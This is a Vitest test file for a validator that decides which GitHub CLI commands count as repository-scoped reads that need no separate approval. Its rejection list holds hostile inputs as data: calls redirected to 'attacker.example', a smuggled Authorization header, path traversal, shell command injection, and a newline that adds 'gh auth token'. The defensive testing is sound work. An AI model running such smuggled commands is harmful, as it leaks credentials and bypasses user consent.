import { describe, expect, it } from 'vitest';
import { githubReadCommandRepository } from '../src/github-command-consent.js';

describe('repository-scoped GitHub CLI read consent', () => {
  it.each([
    'gh run view 42 --repo Owner/Repo --log',
    'gh run view --repo owner/repo --job 123 --log-failed',
    'gh run view 43 -R owner/repo --json jobs,status',
    'gh run list -R owner/repo --limit 10',
    "gh api '/repos/owner/repo/actions/runs/42/jobs?per_page=10'",
    'gh api repos/owner/repo/actions/jobs/123/logs --method GET',
    "gh api /repos/OWNER/REPO/actions/runs/42 --jq '.jobs[] | .name'",
  ])('recognizes a read without binding consent to the run or job: %s', (command) => {
    expect(githubReadCommandRepository(command)).toBe('owner/repo');
  });

  it.each([
    'gh run rerun 42 -R owner/repo',
    'gh run cancel 42 -R owner/repo',
    'gh run download 42 -R owner/repo',
    'gh api /repos/owner/repo/actions/runs/42/rerun -X POST',
    'gh api /repos/owner/repo/issues -f title=change',
    'gh api /repos/owner/repo/issues --input body.json',
    'gh api /repos/owner/repo --hostname attacker.example',
    'gh api /repos/owner/repo -H Authorization:secret',
    'gh api /user',
    'gh api https://attacker.example/repos/owner/repo',
    'gh api /repos/owner/repo/../../other/private',
    'gh api /repos/owner/repo/%2e%2e/other',
    'gh run view 42 --log',
    'gh run view 42 -R owner/repo -R other/repo',
    'gh run view 42 -R owner/repo --web',
    'gh run view 42 -R owner/repo; touch /tmp/changed',
    'gh run view 42 -R owner/repo > output.txt',
    'gh run view $(touch /tmp/changed) -R owner/repo',
    'gh run view `touch /tmp/changed` -R owner/repo',
    'GH_HOST=attacker.example gh run view 42 -R owner/repo',
    'gh run view 42 -R owner/repo\ngh auth token',
    "gh'evil' run view 42 -R owner/repo",
  ])('requires ordinary explicit approval for unsupported commands: %s', (command) => {
    expect(githubReadCommandRepository(command)).toBeUndefined();
  });
});
